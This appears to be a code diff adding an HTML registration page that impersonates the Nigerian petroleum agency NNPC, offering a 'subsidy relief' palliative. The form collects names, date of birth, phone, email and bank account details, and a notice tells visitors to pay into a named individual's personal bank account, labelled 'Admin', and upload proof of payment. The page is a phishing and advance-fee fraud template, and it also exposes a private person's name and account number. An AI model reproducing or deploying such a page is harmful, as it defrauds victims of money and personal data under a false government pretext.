@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ <title>NNPC - P Register</title>
+ 
+ <link rel="stylesheet" href="form.css">
+</head>
+
+<body>
+ 
+  <img src="nnpclogo.png" alt="nnpclogo" class="logo">
+  <h1>Nigeria National Petroleum Commission</h1>
+ 
+  <h2>Subsidy Relief Parliative Registration </h2>
+  
+  <form action="last.html">
+   <table>
+    
+   <tr>
+    <td>
+   <label for="name">Surname</label>
+    </td>
+    <td>
+   <input type="text" name="name" placeholder="Surname" required />
+   </td>
+    </tr>
+   
+   <tr>
+    <td>
+   <label for="name2">Other Names</label>
+    </td>
+    <td>
+   <input type="text" name="name2" placeholder="Other names" required />
+   </td>
+   </tr>
+   
+   <tr>
+    <td><label for="dob">Date of Birth</label></td>
+    <td><input type="date" name="dob" value="DOB" required /></td>
+   </tr>
+   
+   <tr>
+    <td><label for="Phone">Phone Number</label></td>
+    <td><input type="number" name="phone" placeholder="Phone"  required /></td>
+   </tr>
+   
+   <tr>
+    <td><label for="mail">Email Address</label></td>
+    <td><input type="email" name="mail" placeholder="Email" required /></td>
+   </tr>
+   
+   <tr>
+    <td>Occupation</td>
+    
+    <td>
+     <select name="Choose" id="Choose">
+      <option value="Choose">Choose</option>
+      
+     <option value="Student">Student</option>
+     
+     <option value="Business Person">Business Person</option>
+     
+     <option value="Public Servant">Public Servant</option>
+     
+     <option value="Civil Servant ">Civil Servant </option>
+     </select>
+    </td>
+   </tr>
+   
+    <tr>
+     <td><label for="Ano"> Account Number</label></td>
+     <td><input type="number" name="ano" placeholder="Acct. no." required /></td>
+    </tr>
+    
+    <tr>
+     <td><label for="Account"> Account Name </label></td>
+     <td><input type="text" name="aname" placeholder="Acct. Name" required /></td>
+    </tr>
+    
+    <tr>
+     <td><label for="Bank">Bank</label></td>
+     <td><input type="text" name="bank" placeholder="Bank" required /></td>
+    </tr>
+   </table>
+   
+   <h3>Notice</h3>
+   <p>Transfer accordingly to the below account details, Click on the <b>Choose file</b> button to upload Receipt or Prove of Payment. Next input the name on account the money was transfered from in the field provided beneath.</p>
+   <h4>Account No</h4> 
+   <p>0185787278</p>
+   
+    <h4>Account Name</h4>
+    <p>Inyokpa Confidence Okereke <b>(Admin)</b></p>
+    
+     <h4>Bank</h4>
+     <p>Union Bank of Nigeria</p>
+ 
+   <input type="file" name="Upload" id="reciept" class="file" required>
+   <table>
+    
+   <tr>
+    <td>
+     <label for="Name on Account">Name on Account</label>
+    </td>
+    <td>
+  <input type="text" name="acctname" id="aname" placeholder="Name on Account">
+    </td>
+   </tr>
+ 
+   </table>
+   
+   <!-- 
+ <div class="sss">
+  <a href="last.html">
+  -->
+   <button type="submit" class="submit">Submit</button>
+ </div>
+ 
+  </form>
+  
+ 
+
+</body>
+
+</html>
